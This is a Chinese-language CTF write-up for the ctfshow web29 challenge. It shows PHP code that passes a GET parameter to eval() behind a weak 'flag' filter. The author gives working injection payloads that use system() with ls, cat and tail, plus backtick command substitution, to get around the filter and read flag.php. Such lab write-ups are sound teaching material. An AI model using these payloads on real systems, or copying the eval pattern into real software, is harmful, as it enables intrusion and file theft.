ctfshow-WEB入门-web29解题记录
2023-03-01 21:33:54
  * 题目为ctfshow平台WEB入门中的web29，属命令执行类题目
  * 题目有简单的提示：命令执行，需要严格的过滤，点解题目链接
  * 进入题目后，看到一段php源码：
    <?php
    
    /*
    # -*- coding: utf-8 -*-
    # @Author: h1xa
    # @Date:   2020-09-04 00:12:34
    # @Last Modified by:   h1xa
    # @Last Modified time: 2020-09-04 00:26:48
    # @email: h1xa@ctfer.com
    # @link: https://ctfer.com
    
    */
    
    error_reporting(0);
    if(isset($_GET['c'])){
        $c = $_GET['c'];
        if(!preg_match("/flag/i", $c)){
            eval($c);
        }
        
    }else{
        highlight_file(__FILE__);
    }
    代码的大意为：get方法获取参数c，如果参数c中无法正则匹配到字符串flag（过滤掉了flag），则将参数c作为eval函数的入参，此处存在php任意代码执行。
  * 由于已知题目为命令执行类题目，所以直接尝试使用php中的system函数执行ls命令，看看当前目录下都有哪些文件，payload1如下：
    http://15c6b5e4-ceb4-41a1-907c-57d55dc8e44d.challenge.ctf.show/?c=system(%22ls%22);
    payload1执行结果：
  * 看到了flag.php文件，第一时间我是这样做的，但是什么结果也没有
http://15c6b5e4-ceb4-41a1-907c-57d55dc8e44d.challenge.ctf.show/flag.php
  * 已知flag被过滤，可以使用`ls | grep fla`来获取到flag.php，结合cat命令，查看flag.php文件的内容：
    http://15c6b5e4-ceb4-41a1-907c-57d55dc8e44d.challenge.ctf.show/?c=system("cat `ls | grep fla`");
    结果并没有打印flag.php文件，cat命令应该是被过滤了，转而使用tail命令
  * 最终的payload如下：
http://15c6b5e4-ceb4-41a1-907c-57d55dc8e44d.challenge.ctf.show/?c=system("tail `ls | grep fla`");
